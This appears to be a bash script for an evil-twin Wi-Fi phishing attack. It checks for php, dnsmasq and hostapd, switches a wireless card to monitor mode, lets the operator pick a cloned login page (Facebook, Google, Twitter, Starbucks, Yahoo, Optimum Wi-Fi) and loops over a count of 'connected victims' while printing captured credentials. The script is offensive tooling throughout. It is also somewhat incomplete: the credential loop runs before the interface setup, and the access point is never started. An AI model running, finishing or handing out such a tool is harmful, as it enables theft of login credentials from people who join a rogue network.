#!/bin/bash

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\nExiting...\n"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find -name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3
    ifconfig wlan0mon down 2>/dev/null
    sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null
    sleep 1
    ifconfig wlan0mon up 2>/dev/null
    airmon-ng stop wlan0mon > /dev/null 2>&1
    sleep 1
    service network-manager restart
    exit 0
}

function dependencies() {
    sleep 1.5
    counter=0
    echo -e "\nChecking required programs...\n" && sleep 1
    dependencias=(php dnsmasq hostapd)

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            echo -e "The tool $programa is installed"
            let counter+=1
        else
            echo -e "The tool $programa is not installed"
        fi
        sleep 0.4
    done

    if [ "$(echo $counter)" == "3" ]; then
        echo -e "\nStarting...\n"
        sleep 3
    else
        echo -e "It is necessary to have the tools php, dnsmasq, and hostapd installed to run this script\n"
        exit
    fi
}

function chooseSite() {
    echo -e "\nAvailable sites:"
    sites=("facebook-login" "google-login" "twitter-login" "starbucks-login" "yahoo-login" "optimumwifi")  # Add other sites as needed
    for i in "${!sites[@]}"; do
        echo -e "\t$((i+1)). ${sites[i]}"
    done

    while true; do
        echo -ne "\nEnter the number of the site you want to target: " && read site_number

        if [[ $site_number =~ ^[0-9]+$ ]] && ((site_number >= 1 && site_number <= ${#sites[@]})); then
            chosen_site=${sites[site_number-1]}
            echo -e "\nTarget site set to: $chosen_site"
            sleep 1
            break
        else
            echo -e "Invalid choice. Please enter a valid number."
        fi
    done
}

function getCredentials() {
    activeHosts=0
    while true; do
        echo -e "\nWaiting for credentials (Ctrl+C to exit)...\n"
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
        echo -e "Connected victims: $activeHosts\n"
        find -name datos-privados.txt | xargs cat 2>/dev/null
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3
        clear
    done
}

function startAttack() {
    clear
    if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

    echo -e "\nListing available network interfaces..."
    sleep 1

    airmon-ng start wlan0 > /dev/null 2>&1
    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
    counter=1
    for interface in $(cat iface); do
        echo -e "\t$counter. $interface"
        sleep 0.26
        let counter++
    done

    checker=0
    while [ $checker -ne 1 ]; do
        echo -ne "\nInterface name (e.g., wlan0mon): " && read choosed_interface

        for interface in $(cat iface); do
            if [ "$choosed_interface" == "$interface" ]; then
                checker=1
            fi
        done

        if [ $checker -eq 0 ]; then
            echo -e "Invalid interface. Please choose a valid one."
        fi
    done
}

# Function calls in the desired order
dependencies
chooseSite
getCredentials
startAttack